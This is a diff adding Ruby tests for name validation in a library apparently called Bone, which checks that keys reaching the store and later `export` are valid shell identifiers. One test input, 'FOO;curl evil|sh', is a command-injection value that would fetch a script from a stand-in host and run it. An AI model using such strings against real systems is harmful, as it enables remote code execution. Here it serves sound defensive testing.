@@ -40,3 +40,34 @@ rescue Bone::NoToken
   true
 end
 #=> true
+
+# -- F1/F2: write-boundary name validation --------------------------------
+# Client#set is the choke point; it rejects any name that is not a valid
+# shell/env identifier before it can reach the store (and later `export`).
+
+## set rejects a shell-injecting name with InvalidName
+begin
+  @client.set('FOO;curl evil|sh', 'x')
+  false
+rescue Bone::InvalidName
+  true
+end
+#=> true
+
+## index-assign rejects a hyphenated (non-identifier) name
+begin
+  @client['a-b'] = 'v'
+  false
+rescue Bone::InvalidName
+  true
+end
+#=> true
+
+## a valid name still round-trips after the guard
+@client.set('VALID_1', 'ok')
+@client['VALID_1']
+#=> 'ok'
+
+## the rejected names were never stored
+@client.keys.sort
+#=> ['VALID_1', 'nasty', 'nerve']
